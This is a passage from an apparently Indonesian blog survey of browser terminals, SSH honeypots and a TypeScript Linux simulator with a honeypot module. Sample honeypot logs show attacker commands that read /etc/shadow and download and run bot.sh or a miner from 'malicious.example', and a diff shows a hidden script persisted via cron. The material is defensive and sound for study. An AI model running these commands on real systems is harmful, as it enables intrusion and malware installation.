| **Pemakaian Node.js** | ✅ | ❌ | ❌ | ❌ | ❌ (hanya peramban) | lewat Wasmtime |
| **Pemakaian peramban** | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
| **RAM/instans** | 150-256 MB | ~64-128 MB | ~64 MB | 200+ MB | ~100 MB | ~200-500 MB |
| **Waktu boot** | 15-40 dtk | 10-30 dtk | 10-30 dtk | 15-40 dtk | 2-5 dtk | 10-40 dtk |
| **Open source** | ✅ | ✅ | ✅ | ❌ | sebagian | ✅ |
| **Status** | ✅ sangat aktif | ✅ stabil | ⚠️ diarsipkan | ✅ komersial | ✅ aktif | ✅ aktif |

Yang mencolok di tabel ini : `v86` satu-satunya yang merupakan paket npm, yang berjalan baik di peramban maupun Node, dan yang open-source. Makanya ia mendominasi percakapan soal "emulator Linux dalam JavaScript". Sisanya punya kekurangan -- JSLinux tanpa API, jor1k diarsipkan, CheerpX butuh uang, WebContainers hanya peramban dan spesifik Node, container2wasm membutuhkan langkah build dan CLI. Kalau kamu hanya butuh "memboot Linux dalam JavaScript", `v86` nyaris selalu titik awal yang benar.

---

## Bagian 3 -- Stack terminal : xterm.js dan node-pty

Dua paket terus kembali ketika orang membangun pengalaman ala shell. Ini bukan sandbox atau emulator -- melainkan pipa UI dan PTY -- tapi sangat terkait sampai saya merasa bersalah meninggalkannya. Juga, saya memakai keduanya dan mereka benar-benar bagus.

### 3.1 `xterm.js` -- render terminal

xterm.js adalah emulator terminal untuk peramban. Ia menampilkan layar terminal (urutan escape VT100/xterm) dalam elemen `<canvas>`, menangani masukan keyboard, dan mengekspos API untuk merutekan data.

Dipakai oleh : terminal terintegrasi VS Code, Azure Cloud Shell, Proxmox VE, AWS CloudShell, dan banyak lainnya.

```js
import { Terminal } from "@xterm/xterm";
import { FitAddon } from "@xterm/addon-fit";

const term = new Terminal({ cursorBlink: true });
const fitAddon = new FitAddon();
term.loadAddon(fitAddon);
term.open(document.getElementById("terminal"));
fitAddon.fit();

// Mengirim data ke terminal (ditampilkan sebagai teks)
term.write("$ ");
term.onData(data => {
  // data adalah ketikan -- kirim ke backend-mu
  socket.send(data);
});
socket.onmessage(msg => {
  // keluaran backend -- tampilkan
  term.write(msg.data);
});
```

xterm.js hanyalah lapisan render. Ia tidak mengeksekusi shell. Ia tidak menginterpretasikan perintah. Ini widget tampilan yang kamu hubungkan ke backend pilihanmu. Banyak orang mengira xterm.js "membuat terminal" tapi sebenarnya hanya layarnya -- kamu masih harus menghubungkannya ke sesuatu yang benar-benar mengeksekusi perintah.

**npm** : [@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm)
**GitHub** : [xtermjs/xterm.js](https://github.com/xtermjs/xterm.js)

---

### 3.2 `node-pty` -- pembuatan PTY

`node-pty` membuat pseudoterminal (PTY) di Node.js dan memberimu handle baca/tulis di atasnya. Dipakai bersama xterm.js, ia memungkinkan membangun terminal peramban yang bicara dengan shell sungguhan (bash, zsh, fish) yang berjalan di server.

```js
import * as pty from "node-pty";

const shell = pty.spawn("bash", [], {
  name: "xterm-color",
  cols: 80,
  rows: 30,
  cwd: process.env.HOME,
  env: process.env,
});

shell.onData(data => {
  // Kirim ke xterm.js peramban lewat WebSocket
  ws.send(data);
});

ws.on("message", data => {
  // Teruskan ketikan peramban ke shell
  shell.write(data);
});
```

Ini skema standar untuk IDE cloud dan terminal web : xterm.js (peramban) ↔ WebSocket ↔ node-pty ↔ bash sungguhan. Isolasinya tetap tidak ada. Shell berjalan dengan semua izin proses Node.js (atau pengguna yang menjalankannya).

**Dipelihara oleh** : Microsoft.
**npm** : [node-pty](https://www.npmjs.com/package/node-pty)
**GitHub** : [microsoft/node-pty](https://github.com/microsoft/node-pty)

---

## Bagian 4 -- Honeypot SSH

Honeypot dirancang untuk diserang. Tujuannya tampak cukup nyata supaya penyerang berinteraksi dengannya, sambil mencatat semua yang mereka lakukan untuk intelijen ancaman. SSH adalah target utama karena ini layanan paling diserang di internet -- kalau kamu mengekspos port 22 di IP publik, kamu akan melihat upaya scan otomatis dalam hitungan menit secara harfiah. Coba suatu hari, cukup mengerikan betapa cepatnya itu terjadi.

Kualitas honeypot diukur dari dua hal : **kesetiaan** (seberapa meyakinkan ia meniru sistem sungguhan) dan **telemetri** (berapa banyak data berguna yang ditangkapnya). Kedua hal ini bertentangan. Honeypot kesetiaan tinggi lebih sulit dibangun dan lebih berisiko dioperasikan.

Bagian inilah yang akhirnya membawa saya membangun modul `HoneyPot` di `typescript-virtual-container`, jadi saya punya beberapa opini di sini.

### 4.1 Cowrie -- standar emas

Cowrie adalah honeypot SSH dan Telnet interaksi sedang-ke-tinggi berbasis Python. Ini honeypot SSH paling banyak di deploy di komunitas riset dan keamanan.

Arsitektur :
- **Lapisan protokol** : implementasi protokol SSH sungguhan (Twisted Conch), jadi penyerang mendapatkan handshake sungguhan, pertukaran kunci sungguhan, autentikasi sungguhan
- **Lapisan shell** : sistem berkas tiruan (menyerupai Debian 5.0) dan interpreter shell parsial yang menjawab perintah umum
- **Mode proxy** : bisa mengarahkan ke sistem sungguhan di belakang (mode interaksi tinggi), sambil mencatat semua yang lewat
- **Mode LLM** (tambahan terbaru) : memakai model bahasa untuk membangkitkan respons dinamis atas perintah yang tidak tahu ditanganinya -- ya, Cowrie kini punya mode AI. Kita hidup di zaman gila.

```python
# Apa yang ditangkap Cowrie
{
  "timestamp": "2024-01-15T03:22:11.847Z",
  "src_ip": "45.33.32.156",
  "username": "root",
  "password": "123456",
  "session": "abc123",
  "commands": [
    "uname -a",
    "cat /etc/passwd",
    "wget http://malicious.example/bot.sh",
    "chmod +x bot.sh",
    "./bot.sh"
  ],
  "files_downloaded": ["bot.sh"]
}
```

Cowrie menyimpan berkas yang diunduh (lewat wget/curl/SFTP/SCP) untuk analisis malware. Ia terintegrasi dengan Splunk, Elasticsearch, dan platform SIEM lain.

**Kesetiaan** : sedang-tinggi. Cukup meyakinkan untuk mengelabui bot otomatis (yang mewakili 99% penyerang SSH -- kebanyakan hanya skrip bodoh yang mencoba `root`/`password`). Manusia canggih bisa mengidentifikasinya lewat sidik jari, biasanya cukup cepat.

**Bahasa** : Python (Twisted)
**GitHub** : [cowrie/cowrie](https://github.com/cowrie/cowrie)

---

### 4.2 Kippo -- pendahulu Cowrie

Kippo adalah honeypot SSH interaksi sedang yang asli tempat Cowrie didasarkan. Ide dasar yang sama : protokol SSH sungguhan, sistem berkas tiruan, shell parsial. Cowrie telah sepenuhnya menggantikannya pada tahap ini -- Kippo diarsipkan dan tidak ada yang boleh memakainya pada 2026. Disebut di sini murni untuk kelengkapan historis, karena kamu bisa melihatnya direferensikan di artikel blog lama dan makalah keamanan.

**GitHub** : [desaster/kippo](https://github.com/desaster/kippo) -- diarsipkan

---

### 4.3 endlessh -- tarpit SSH

endlessh adalah honeypot terdegenerasi : ia menjaga koneksi SSH tetap terbuka dengan menyiarkan perlahan data banner 1 oktet per detik (atau kurang). Klien SSH yang terhubung akan macet tanpa batas -- ia tidak akan pernah sampai autentikasi karena server tidak pernah selesai mengirim banner.

Tujuannya bukan intelijen ancaman melainkan penolakan sumber daya murni : menyibukkan thread scan penyerang supaya mereka tidak bisa mencapai target sungguhan secepat itu. Ini sejujurnya agak jahat dalam arti yang baik. Kamu tidak belajar apa pun dari penyerang -- kamu hanya membuang waktunya. Ada sesuatu yang sangat memuaskan di dalamnya.

```c
// Seluruh perilaku protokoler endlessh :
// Mengirim : "SSH-2.0-OpenSSH_" lalu menambah perlahan karakter acak
// Tidak pernah menutup koneksi
// Scanner penyerang kedaluwarsa setelah N detik
```

Tidak ada perintah yang ditangkap. Tidak ada autentikasi yang diuji. Hanya waktu koneksi.

**Ditulis dalam** : C
**GitHub** : [skeeto/endlessh](https://github.com/skeeto/endlessh)

---

### 4.4 sshesame -- honeypot "biarkan semua orang masuk"

sshesame menerima semua koneksi SSH (pengguna apa pun, kata sandi apa pun, kunci apa pun) dan mencatat semuanya. Ini honeypot interaksi nol : ia tidak menjawab perintah, ia hanya membiarkan penyerang "masuk" dan mencatat setiap ketikan yang mereka ketik.

```
2024-01-15 03:22:11 Koneksi dari 45.33.32.156
  Pengguna : root, Kata sandi : password123 -- diterima
  Perintah yang diketik :
    cat /etc/shadow
    wget http://malicious.example/miner
    uname -a
  Terputus setelah 47 dtk
```

Berguna untuk panen kredensial : kamu cepat mengakumulasi nama pengguna dan kata sandi yang dicoba bot, yang memberi tahu kredensial bawaan mana yang sedang aktif di bruteforce. Bocoran : selalu `root`/`password`, `admin`/`admin`, dan `root`/`123456`. Setiap kali.

**GitHub** : [jaksi/sshesame](https://github.com/jaksi/sshesame)

---

### 4.5 Lyrebird -- framework honeypot berbasis Docker

`lyrebird/honeypot-base` adalah image dasar Docker untuk membangun honeypot layanan jaringan. Ini bukan khusus honeypot SSH -- melainkan framework untuk membangun honeypot untuk protokol apa pun.

Image dasar menyediakan framework pencatatan, sistem plugin untuk protokol, dan konfigurasi Docker Compose untuk honeypot multi-layanan. Kamu memperluasnya untuk mensimulasikan layanan spesifik.

**Docker Hub** : [lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)

---

### 4.6 Membangun honeypot SSH di Node.js -- metode naif, dan kenapa gagal

Sebelum `typescript-virtual-container`, membangun honeypot SSH di Node.js berarti menggabung pustaka `ssh2` sungguhan dengan simulasi perintah manual. Sangat melelahkan, sangat tak lengkap, tapi... ini jalan wajib pada tahap ini :

```js
import { Server } from "ssh2";
import { readFileSync } from "fs";
import { appendFileSync } from "fs";

const hostKey = readFileSync("./host.key");

new Server({ hostKeys: [hostKey] }, client => {
  client.on("authentication", ctx => {
    // Mencatat upaya
    appendFileSync("creds.log", `${ctx.username}:${ctx.credentials?.password}\n`);
    ctx.accept(); // Biarkan semua orang masuk
  });

  client.on("ready", () => {
    client.on("session", (accept) => {
      const session = accept();
      session.on("shell", accept => {
        const stream = accept();
        stream.write("Last login: Mon Jan 15 03:00:00 2024 from 10.0.0.1\r\n");
        stream.write("root@ubuntu:~# ");
        stream.on("data", data => {
          const cmd = data.toString().trim();
          appendFileSync("commands.log", `${cmd}\n`);
          // Respons simulasi
          if (cmd === "uname -a") {
            stream.write("\r\nLinux ubuntu 5.15.0-91-generic #101-Ubuntu x86_64 GNU/Linux\r\n");
          } else {
            stream.write(`\r\n${cmd}: command not found\r\n`);
          }
          stream.write("root@ubuntu:~# ");
        });
      });
    });
  });
}).listen(2222);
```

Ini "berhasil" dalam arti menangkap kredensial dan perintah. Tapi jelas palsu begitu penyerang canggih menggali sedikit. `uname -a` mengembalikan string yang benar tapi `ls /etc` mengembalikan "command not found" -- itu bau jebakan menyengat. Sistem berkas tidak ada. Perintah tidak berantai. Pipe tidak berfungsi. Variabel tidak mengembang.

Penyerang kompeten akan mengidentifikasi honeypot-mu dalam lima perintah pertama. Skrip otomatis yang mencari perilaku ala Cowrie juga langsung mendeteksinya. Rupanya inilah yang mendorong penulis `typescript-virtual-container` membangun sesuatu yang benar-benar menginterpretasikan perintah sungguhan -- lebih lanjut soal itu di Bagian 5.

---

### Ringkasan keluarga honeypot

| | Cowrie | Kippo | endlessh | sshesame | Lyrebird | Naif ssh2 |
|---|---|---|---|---|---|---|
| **Tingkat interaksi** | sedang-tinggi | sedang | nol | nol | variabel | rendah |
| **Protokol SSH sungguhan** | ✅ | ✅ | ❌ (tarpit) | ✅ | variabel | ✅ |
| **Kesetiaan shell** | sedang | sedang | n/a | tidak ada | variabel | minimal |
| **Menangkap kredensial** | ✅ | ✅ | ❌ | ✅ | ✅ | ✅ |
| **Menangkap perintah** | ✅ | ✅ | ❌ | ✅ | variabel | ✅ |
| **Menangkap malware** | ✅ | ✅ | ❌ | ❌ | ❌ | ❌ |
| **Integrasi SIEM** | ✅ native | ❌ | ❌ | ❌ | ❌ | manual |
| **Respons LLM** | ✅ (baru) | ❌ | ❌ | ❌ | ❌ | ❌ |
| **Bahasa** | Python | Python | C | Go | Docker | Node.js |
| **Node.js native** | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **Status** | ✅ sangat aktif | ⚠️ diarsipkan | ✅ aktif | ✅ aktif | ✅ aktif | DIY |

Polanya di sini cukup jelas : makin kamu ingin kesetiaan, makin banyak Python yang harus kamu tulis. Cowrie pemenang tak terbantahkan kalau kamu melakukannya serius -- ia telah teruji lapangan selama bertahun-tahun dan menangkap jauh lebih dari sekadar kredensial. endlessh dan sshesame adalah proyek asyik lebih daripada alat intelijen ancaman serius. Dan pendekatan naif di Node.js membawamu mungkin 20% jalan sebelum kamu menabrak tembok.

---

## Bagian 5 -- `typescript-virtual-container` : yang menjembatani kesenjangan

OKE jadi di sinilah hal-hal menjadi menarik. Setelah mengkatalogkan semua keluarga di atas, kuadran yang hilang menjadi cukup jelas :

- Sandbox JS : mengisolasi kode, tanpa shell, tanpa sistem berkas, tanpa SSH
- Emulator Linux : OS sungguhan, shell sungguhan, SSH sungguhan... tapi 150+ MB RAM, 30 detik boot, dan kamu harus membangun API sendiri di atas I/O serial
- Honeypot : shell tiruan, tanpa API yang bisa diprogram, Python/Go/C, tidak native Node

Tidak ada yang membangun lingkungan Linux lengkap, bisa diprogram, native Node, dengan SSH sungguhan, izin sungguhan, jaringan virtual sungguhan, dan API TypeScript bertipe. Jadi ia membangunnya.

Perkenalan kecil karena ini pertama kalinya saya menyebutnya dengan benar : `typescript-virtual-container` dibangun oleh [Chloé Rolzhausen](https://itsrealfortune.fr), pengembang Prancis yang menyebut dirinya **Fortune** (atau ItsRealFortune) online. Kamu bisa menemukannya di [situs webnya](https://itsrealfortune.fr) dan di [LinkedIn](https://www.linkedin.com/in/chlo%C3%A9-rolzhausen-1b0439316/). Seluruh proyek -- 56 000 baris TypeScript, 247 berkas, 170 perintah -- adalah upaya solo oleh satu orang. Saya akan memanggilnya Fortune untuk sisa artikel. Dan ya, itu cukup gila. Lihat pekerjaannya!

### Apa sebenarnya ini

`typescript-virtual-container` adalah **simulator lingkungan Linux** yang ditulis dalam TypeScript murni. Tanpa Wasm, tanpa ekstensi native, tanpa kernel. ~56 000 baris sumber terbagi atas 247 berkas TypeScript.

Wawasan kuncinya : kamu tidak butuh emulator CPU untuk membuat `ls /etc | grep passwd` berfungsi. Kamu butuh :
1. Pohon node di memori yang menjawab operasi path
2. Model izin POSIX yang diterapkan di setiap akses
3. Parser sintaksis shell yang memahami pipeline, redireksi, sub-shell dan ekspansi variabel
4. ~170 implementasi perintah (fungsi, bukan biner)
5. Sistem manajemen pengguna dan grup
6. Sesuatu untuk mengekspos semua itu lewat SSH

Semua itu bisa dilakukan dalam TypeScript murni tanpa keterlibatan kernel apa pun.

### VirtualFileSystem

VFS adalah pohon di memori dari node bertipe -- tanpa I/O disk kecuali kamu eksplisit mengaktifkan mode persistensi `"fs"` :

```ts
// Representasi internal yang disederhanakan
type InternalNode =
  | { type: "file"; content: string | Uint8Array; mode: number; uid: number; gid: number; mtime: number }
  | { type: "dir"; children: Map<string, InternalNode>; mode: number; uid: number; gid: number }
  | { type: "symlink"; target: string }
  | { type: "device"; kind: "char" | "block"; read(): string; write(data: string): void }
  | { type: "stub" }; // placeholder yang dimuat malas
```

Setiap operasi path melewati `normalizePath` (menyelesaikan `.`, `..`, tautan simbolis) dan `enforceAccess` (memeriksa izin baca/tulis/eksekusi terhadap uid/gid peminta). `chmod`, `chown`, sticky bit dan setuid semuanya diimplementasikan dan benar-benar diterapkan. Kalau proses yang berjalan sebagai uid 1000 mencoba membaca berkas milik root dengan mode 0600, ia mendapat EACCES -- bukan EACCES palsu, `Error` JavaScript sungguhan yang dilempar dari pemeriksaan izin. Bagian ini cukup elegan sejujurnya.

VFS terserilakan menjadi :
- `.vfsb` -- format biner ringkas (kustom, dengan kompresi fflate) -- ini format bawaan
- Snapshot JSON -- bisa dibaca manusia, bagus untuk debugging
- Arsip TAR -- import/ekspor dengan format tar sungguhan, jadi kamu bisa `tar -xf` sesuatu dan VFS hanya... punya berkas itu
- Image SquashFS -- import baca-saja

Dalam mode persistensi `"fs"`, ia memelihara jurnal write-ahead (WAL) untuk pemulihan setelah crash -- penulisan masuk dulu ke jurnal, lalu ke snapshot saat flush. Kalau Node crash di tengah operasi, jurnal memungkinkanmu membangun ulang keadaan lengkap terakhir.

Ada juga lapisan `FileCache` yang mensimulasikan latensi I/O disk. Kamu mengonfigurasi profil seperti `NVME_DISK_IO` atau `HDD_DISK_IO` dan VFS artifisial menunda operasi berkas agar cocok dengan pewaktuan realistis. Yang cukup lucu -- perangkat lunak yang sengaja memperlambat diri untuk mensimulasikan perangkat keras -- tapi sebenarnya sangat berguna untuk benchmarking.

### Interpreter shell

Parser sintaksis shell menghasilkan AST bertipe :

```ts
// "ls /etc | grep root && echo done" diurai menjadi :
{
  type: "statement",
  pipeline: [
    { name: "ls", args: ["/etc"], redirects: [] },
    { name: "grep", args: ["root"], redirects: [] }
  ],
  next: {
    op: "&&",
    statement: {
      type: "statement",
      pipeline: [{ name: "echo", args: ["done"], redirects: [] }],
      next: null
    }
  }
}
```

Eksekutor melintasi AST ini :
- Untuk pipeline, ia membuat rantai aliran `{ stdin, stdout, stderr }` dan mengeksekusi tiap perintah dengan I/O yang di pipeline
- Untuk operator logis (`&&`, `||`), ia memeriksa `$?` setelah sisi kiri sebelum mengeksekusi kanan
- Untuk sub-shell (`$(...)`, `` ` ` ``), ia mencabangkan konteks eksekusi
- Untuk redireksi (`>berkas`, `>>berkas`, `2>&1`, `<berkas`), ia mengonfigurasi pengkabelan aliran sebelum eksekusi
- Untuk tugas latar (`cmd &`), ia berjalan tanpa menunggu selesai
- Untuk variabel, ia mengembangkan `$VAR`, `${VAR:-default}`, `${#VAR}`, dan aritmetika `$((expr))`
- Untuk ekspansi kurung (`{a,b,c}`, `{1..5}`), ia membangkitkan daftar ekspansi lengkap sebelum mengeksekusi

Semua itu perilaku shell POSIX sungguhan. Parser menangani heredoc, substitusi proses, globbing (`*`, `?`, `[abc]`), dan penanganan kutip (kutip tunggal, kutip ganda dengan interpolasi, escape backslash). Ini tidak sempurna -- kasus batas ada -- tapi jauh melampaui apa yang kamu harapkan dari proyek TypeScript.

### ~170 perintah bawaan

Perintah adalah fungsi TypeScript yang terdaftar dalam registri perintah. Mereka menerima `CommandContext` dengan aliran stdin/stdout/stderr, VFS, sesi pengguna, environment shell, dan akses ke sub-modul.

Menulis 170 implementasi perintah Unix itu... banyak. Sebagian trivial (`echo`, `true`, `false`), sebagian mengejutkan rumit (`awk`, `find`, `tar`). Maksudnya, `awk` POSIX lengkap? Dalam TypeScript? Gila sejujurnya. Berikut sampel dari isinya :

```
cat, ls, cp, mv, rm, mkdir, rmdir, touch, chmod, chown, chgrp,
ln, readlink, find, locate, stat, file,
echo, printf, read, test, [, [[,
grep, sed, awk, cut, sort, uniq, wc, head, tail, tr,
ps, top, kill, pkill, nice, ionice,
ssh, scp, sftp (sisi klien, koneksi keluar),
ping, curl, wget, nc, netstat, ss, ip, ifconfig, route,
apt, apt-get, apt-cache, dpkg, pacman,
useradd, usermod, userdel, groupadd, passwd, su, sudo,
tar, gzip, gunzip, bzip2, bunzip2, xz, unxz, zip, unzip,
git (stub), python3 (stub), node (stub),
nano (editor interaktif lengkap), vim (dasar), vi (dasar),
neofetch, htop, tree, df, du, free, uptime, who, w, last,
cron (disimulasi), systemctl (stub), journalctl (stub),
...dan sekitar 130 lainnya
```

"Stub" (git, python3, node) menjawab realistis pada invokasi umum -- `python3 --version` mengembalikan string versi yang kredibel, `git status` menunjukkan keadaan depot fiktif -- tanpa melakukan kerja nyata. Untuk honeypot, ini sebenarnya lebih berguna daripada perintah sungguhan, karena memungkinkanmu mengamati apa yang coba dieksekusi penyerang tanpa mengeksekusi sesuatu yang berbahaya.

### Server SSH

Lapisan SSH memakai paket npm `ssh2` sungguhan -- protokol SSH sungguhan, pertukaran kunci sungguhan, enkripsi sungguhan. `SSHMimic` membungkusnya :

```ts
import { VirtualSshServer } from "typescript-virtual-container";

const ssh = new VirtualSshServer({
  port: 2222,
  hostname: "prod-server-01",
  shellProperties: {
    kernel: "5.15.0-91-generic #101-Ubuntu SMP",
    os: "Ubuntu 22.04.3 LTS",
    arch: "x86_64",
  },
});
await ssh.start();
// SSH sungguhan : ssh -p 2222 root@localhost
// SFTP sungguhan : sftp -P 2222 root@localhost
// SCP sungguhan : scp -P 2222 file root@localhost:/tmp/
```

`shellProperties` menentukan apa yang dilaporkan `uname -a`, `lsb_release -a`, `neofetch`, `/proc/version`, dan `/etc/os-release`. Kamu bisa meniru distro Linux dan versi kernel apa pun secara meyakinkan -- bagi klien SSH sungguhan, harfiah tidak ada cara membedakannya.

### Modul HoneyPot

Karena interpreter shell nyata dan server SSH nyata, perintah penyerang benar-benar dieksekusi di lingkungan virtual. Permintaan `wget` yang dipicu penyerang dicatat dengan URL tujuan. Berkas yang dibuat penyerang disimpan di VFS. Upaya eskalasi hak penyerang menghasilkan error realistis.

```ts
import { VirtualSshServer, HoneyPot, diffSnapshots } from "typescript-virtual-container";

const pot = new HoneyPot({
  onCommand: (session, cmd) => threatIntel.record({ cmd, ip: session.remoteAddress }),
  onDownload: (session, url) => malwareAnalysis.queue(url),
  onAuthentication: (username, password, accepted) => credHarvest.log({ username, password }),
});

const ssh = new VirtualSshServer({ port: 22, honeypot: pot });
await ssh.start();

// Setelah sesi, membedakan sistem berkas
const before = shell.vfs.toSnapshot();
// ... sesi penyerang ...
const after = shell.vfs.toSnapshot();
const diff = diffSnapshots(before, after);
/*
  diff = [
    { op: "create", path: "/tmp/.hidden/bot.sh", content: "#!/bin/bash\ncurl..." },
    { op: "chmod", path: "/tmp/.hidden/bot.sh", from: 0o644, to: 0o755 },
    { op: "create", path: "/var/spool/cron/root", content: "* * * * * /tmp/.hidden/bot.sh" }
  ]
*/
```

Ini secara kualitatif berbeda dari Cowrie. Sistem berkas tiruan Cowrie bisa menjawab `ls` tapi tidak bisa benar-benar melacak berkas yang dibuat penyerang dan modifikasi yang dibuatnya sebagai diff terstruktur. `typescript-virtual-container` bisa, karena VFS adalah struktur data hidup -- setiap penulisan dilacak. Entri cron yang baru ditambahkan penyerang? Ada di diff. Folder `.hidden` itu? Di diff. Cukup berguna untuk analisis malware.

### Tumpukan jaringan virtual

Ini mungkin bagian paling mengesankan dari seluruh proyek, dan tidak punya padanan di proyek lain mana pun di ruang ini. Maksudnya, tumpukan jaringan virtual L2/L3 lengkap dengan dukungan VPN, ditulis dalam TypeScript murni, tanpa kartu jaringan nyata apa pun terlibat. Benar-benar gila.

`VirtualNetworkManager` memberi setiap instans `VirtualShell` antarmuka jaringan virtual dengan alamat IP yang bisa dikonfigurasi, tabel routing, dan firewall perangkat lunak (aturan ala iptables dengan conntrack dan NAT). `ip addr`, `ip route`, `iptables -L`, `netstat -rn` semuanya menunjukkan keadaan jaringan virtual.

`VirtualSwitch` (bernama Baie -- dari kata Prancis untuk rak server, "baie informatique") menghubungkan banyak shell pada subnet bersama. Ia mengimplementasikan :
- Pembelajaran MAC dan ARP
- Routing IP antar subnet
- NAT (masquerade keluar)
- DNS (catatan yang bisa dikonfigurasi per subnet)
- Penyeimbangan beban (round-robin, koneksi paling sedikit)
- Pembentukan trafik : latensi, jitter (distribusi gauss), kehilangan paket, kehilangan beruntun, penataan ulang, duplikasi
- Pembatasan bandwidth (ember token)
- Penerapan MTU
- Pelacakan koneksi (dengan keadaan, keadaan NEW/ESTABLISHED/TIME_WAIT)

```ts
const baie = new Baie("192.168.0.0/24");

// Tiga mesin virtual di switch yang sama
const web = new VirtualShell("web");
const api = new VirtualShell("api");
const db  = new VirtualShell("db");

baie.attach(web, "192.168.0.2");
baie.attach(api, "192.168.0.3");
baie.attach(db,  "192.168.0.4");

// Firewall : web bisa mencapai api, api bisa mencapai db, web tidak bisa mencapai db langsung
baie.addFirewallRule({ src: "192.168.0.2", dst: "192.168.0.4", proto: "tcp", action: "DROP" });

// Pembentukan trafik : mensimulasikan tautan WAN tak stabil ke luar
baie.setInterface("192.168.0.2", { latencyMs: 50, jitterMs: 10, packetLoss: 0.001 });
```

`VirtualVpn` membuat tunnel terenkripsi antar instans Baie -- kamu bisa mensimulasikan jaringan multi-situs dengan interkoneksi VPN antar situs.

`VirtualProxy` mengimplementasikan forwarding port dan proxy SOCKS5.

Tidak satu pun dari itu menyentuh kartu jaringan sungguhan. Semuanya routing objek TypeScript. Perintah `ping` "berhasil" dengan merutekan lewat switch virtual dan mengembalikan respons ICMP simulasi. `curl http://192.168.0.3/api` merutekan lewat jaringan virtual, mencapai respons HTTP simulasi dari shell api, dan mengembalikan isinya. Ini kura-kura sampai ke bawah, dalam arti terbaik.

### `SandboxedShell`

Untuk pemakaian programatik di mana kamu butuh isolasi lebih kuat, `SandboxedShell` mengeksekusi sesi shell dalam thread Worker Node.js :

```ts
import { SandboxedShell } from "typescript-virtual-container";

const shell = new SandboxedShell({
  memoryMB: 128,
  cpuQuota: 0.25, // 25% satu core
  timeoutMs: 5000,
});

const result = await shell.exec("ls /etc | grep -c .");
console.log(result.stdout); // "42\n"
console.log(result.exitCode); // 0
```

Isolasinya di sini dijamin lapisan VFS (shell thread worker hanya bisa melihat sistem berkas virtual, tidak pernah sistem berkas host) ditambah isolasi memori thread Worker Node.js. Ini lebih ringan daripada `isolated-vm` tapi lebih tepat untuk isolasi tingkat shell alih-alih tingkat JS.

### Pembatasan sumber daya

Kamu bisa mengonfigurasi batas sumber daya per shell yang memengaruhi apa yang dilaporkan perintah monitoring sistem :

```ts
const shell = new VirtualShell("limited-vm", {}, {}, {
  maxRamMB: 512,
  maxCpuCores: 2,
});
```

Di dalam shell ini, `free -m` menunjukkan 512 MB RAM total. `nproc` mengembalikan 2. `/proc/meminfo` menunjukkan nilai yang dibatasi. `htop` dan `top` menunjukkan jumlah CPU yang dibatasi. Itu memungkinkanmu mendefinisikan tepat jejak perangkat keras mesin yang disimulasikan.

### Tiga mode deployment

```
Mode 1 : Server SSH/SFTP
  VirtualSshServer / VirtualSftpServer
  → Protokol SSH sungguhan, SFTP sungguhan, SCP sungguhan
  → Kasus pemakaian : honeypot, lingkungan uji jarak jauh, lab pelatihan

Mode 2 : Shell web (peramban)
  builds/fortune-nyx-v1.7.8-web.min.js (bundle ESM)
  → Berjalan di peramban, VFS dipersistenkan di IndexedDB
  → Kasus pemakaian : tutorial interaktif, terminal tertanam, demo
  → Bonus : menjalankan startxfce4 untuk desktop XFCE lengkap yang disimulasikan

Mode 3 : CLI mandiri
  builds/fortune-nyx-v1.7.8-directbash-k6.1.0.mjs (satu berkas, tanpa instalasi)
  → curl dan jalankan, VFS dipersistenkan di direktori .vfs/
  → Kasus pemakaian : demo cepat, eksperimen lokal
```

### Polyfill -- cara build peramban bekerja tanpa Wasm

OKE ini bagian yang menurut saya benar-benar cerdas dan ingin saya soroti khusus.

Membuat pustaka Node.js berfungsi di peramban umumnya mimpi buruk. Entah kamu memakai runtime Wasm (berat, lambat dimuat), atau kamu menghabiskan berminggu-minggu mengganti manual setiap import `node:*` dengan alternatif yang kompatibel peramban. Fortune melakukan yang kedua -- tapi sangat bersih, dengan menulis himpunan polyfill kustom yang hidup di direktori `polyfills/` repo.

Pipeline build hanyalah esbuild dengan setumpuk entri `alias` :

```js
// demo/build.js -- seluruh config build peramban
esbuild.build({
  entryPoints: ['app.ts'],
  bundle: true,
  platform: 'browser',
  alias: {
    'node:events':         '../polyfills/node_events/index.js',
    'node:path':           '../polyfills/node_path/index.js',
    'node:os':             '../polyfills/node_os/index.js',
    'node:fs':             '../polyfills/node_fs/index.js',
    'node:fs/promises':    '../polyfills/node_fs/promises.js',
    'node:crypto':         '../polyfills/node_crypto/index.js',
    'node:child_process':  '../polyfills/node_child_process/index.js',
    'node:zlib':           '../polyfills/node_zlib/index.js',
    'node:vm':             '../polyfills/node_vm/index.js',
    'node:net':            '../polyfills/node_net/index.js',
    'node:url':            '../polyfills/node_url/index.js',
    'node:worker_threads': '../polyfills/node_worker_threads/index.js',
    'ssh2':                '../polyfills/ssh2/index.js',
    'roxify':              '../polyfills/roxify.js',
  },
  inject: ['../polyfills/process.js', '../polyfills/buffer.js'],
  minify: true,
  treeShaking: true,
});
```

Tanpa Wasm, tanpa pustaka polyfill eksternal, tanpa jalan ke `webpack-node-externals`. Hanya modul yang di alias dan beberapa global yang disuntikkan. Biar saya rincikan masing-masing karena beberapa benar-benar mengesankan.

**`node:fs` -- IndexedDB sebagai sistem berkas tiruan**

Yang ini favorit saya. Polyfill `node:fs` mengimplementasikan API sinkron Node.js fs (`readFileSync`, `writeFileSync`, `existsSync`, `readdirSync`, `mkdirSync`, `unlinkSync`, `statSync`...) yang didukung dua lapisan : `Map` di memori untuk bacaan sinkron, dan IndexedDB untuk persistensi antar pemuatan ulang halaman. Penulisan masuk ke Map segera (jadi `readFileSync` tepat setelah `writeFileSync` selalu berhasil), lalu dikosongkan ke IndexedDB asinkron di latar belakang.

```js
// Cache sinkron (path → Uint8Array | null) -- bacaan seketika
const memCache = new Map();

// Memuat awal segalanya dari IndexedDB ke memCache saat startup
openDB().then(db => {
  const tx = db.transaction(STORE, 'readonly');
  const req = tx.objectStore(STORE).openCursor();
  req.onsuccess = e => {
    const cursor = e.target.result;
    if (!cursor) return;
    memCache.set(cursor.key, cursor.value);
    cursor.continue();
  };
});
```

Inilah alasan snapshot VFS bertahan dari pemuatan ulang halaman di peramban -- seluruh biner `.vfsb` ditulis ke IndexedDB lewat polyfill ini, dan dibaca ulang saat pemuatan berikutnya. Tanpa Wasm, tanpa server. Hanya IndexedDB, yang ada di semua peramban sejak 2011.

**`node:crypto` -- SHA-256 dalam JS murni**

